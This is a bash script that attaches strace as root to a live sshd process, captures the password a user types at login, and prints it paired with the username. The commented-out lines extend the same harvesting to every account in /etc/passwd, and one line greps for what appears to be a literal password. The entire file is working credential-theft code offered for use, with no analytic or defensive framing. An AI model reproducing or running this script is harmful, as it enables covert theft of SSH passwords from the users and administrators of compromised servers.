#!/usr/bin/env bash

function getpass() {
	ssh_pwd_pid=$(ps -ef | grep sshd | grep net | awk '{print $2}')
	[[ -z $ssh_pwd_pid ]] && return

	username=$(ps -ef | grep -v "grep" | grep -Eo "sshd:.*net" | cut -d " " -f 2)
	log_file="/root/sshd_log.$username"

	strace -e write -p $ssh_pwd_pid -s 150 -o $log_file 2>/dev/null

	pwd_line=$(grep -B 5 "exited with 0" $log_file | sed -n "1p" | sed -r 's/.*\\.\\.\\.\\.(.*)".*/\1/')

	if [[ ! -z $pwd_line ]]; then
		printf "$username|$pwd_line\n"
	fi

	rm $log_file
}

function getusername() {
	while [[ true ]]; do

		ssh_pwd_pid=$(ps -ef | grep sshd | grep net | awk '{print $2}')
		[[ -z $ssh_pwd_pid ]] && return

		username=$(ps -ef | grep -v "grep" | grep -Eo "sshd:.*net" | cut -d " " -f 2)
		log_file="/root/sshd_log.$username"
	done
}

# while [[ true ]]; do
# done

# getpass

# grep -E "Ic3kr3am!202" ~/sshd_getpass

# for user in $(grep -vE 'nologin|false' /etc/passwd | cut -d ":" -f 1); do
# 	PASSWORD=$(grep -B 40 -E "Accepted.*$user" ~/sshd_getpass | grep "read(6" | grep -v unfinished | cut -d '"' -f 2 | sed 's/\\.//g')
# 	if [ "$PASSWORD" ]; then
# 		echo "USER: $user"
# 		echo $NEWPASS
# 	fi
# done

ssh_pwd_pid=$(ps -ef | grep sshd | grep net | awk '{print $2}')
[[ -z $ssh_pwd_pid ]] && exit

username=$(ps -ef | grep -v "grep" | grep -Eo "sshd:.*net" | cut -d " " -f 2)
log_file="/root/sshd_log.$username"

strace -e write -p $ssh_pwd_pid -s 150 -o $log_file 2>/dev/null

pwd_line=$(grep -B 5 "exited with 0" $log_file | sed -n "1p" | sed -r 's/.*\\.\\.\\.\\.(.*)".*/\1/')

if [[ ! -z $pwd_line ]]; then
	printf "$username|$pwd_line\n"
fi

# grep -B 5 "exited with 0" /root/sshd_log.vcth4nh | sed -n "1p" | sed -r 's/.*\\.\\.\\.\\.(.*)".*/\1/'

# while [[ ! -z $(ps -ef | grep ssh_pwd_pid) ]]; do
# 	success=$(grep -B 38 -E "sendto.*Accepted password for.*" $log_file | grep "read(6, " | sed -n '2p')
# 	[[ -z success ]] || break
# done

# rm $log_file

# grep -B 40 -E "sendto.*Accepted password for.*" /root/sshd_log.vcth4nh | grep "read(6, " | sed -n '2p'
